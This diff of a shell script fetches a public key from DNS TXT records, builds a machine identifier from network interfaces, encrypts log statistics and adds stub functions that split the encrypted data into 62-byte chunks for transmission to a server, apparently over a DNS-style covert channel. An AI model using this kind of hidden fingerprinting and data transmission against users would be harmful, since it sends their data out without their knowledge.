@@ -15,7 +15,7 @@ get_key()
   key=""
   key_pos="\$2"
   echo "-----BEGIN PUBLIC KEY-----"  > $KEY_FILE
-  for i in {1..3};
+  for i in $(seq 1 3);
   do
     key=$key$(dig $DOMAIN TXT @8.8.8.8 | awk -F \;=\; "/pass$i/ { print $key_pos
   }" | tr -d '"')
@@ -90,6 +90,7 @@ generate_id()
   if_list='';
   uid=''
 
+  # TODO replace with find
   for interface in $(ls /sys/class/net/);
   do
     if [ "$interface" != 'lo' ]; then
@@ -137,7 +138,37 @@ encrypt_id()
   echo $enc_id
 }
 
+# split the data into chunks
+#
+# Arguments:
+#   data: data to split in chunks
+#
+# Returns:
+#   chunks: a newline sperated string of 62 byte length
+#
+chunk_data()
+{
+  data="$1"
+  if [ "$(expr ${#data} % 62)" -eq 0 ]; then
+    splits=$(expr ${#data} / 62)
+  else
+    splits=$(expr $(expr ${#data} / 62) + 1)
+  fi
+}
+
+# Transmitt enrypted and encoded data to server
+#
+# Arguments:
+#   tdata: transmission ready data
+#
+transmitt_enc_data()
+{
+  tdata="$1"
+  chunk_data "$tdata"
+}
+
 stats="$(get_statistics $LOG_FILE)"
 get_key
 encrypt_id
 enc_stats="$(encrypt_data $stats)"
+transmitt_enc_data "$enc_stats"
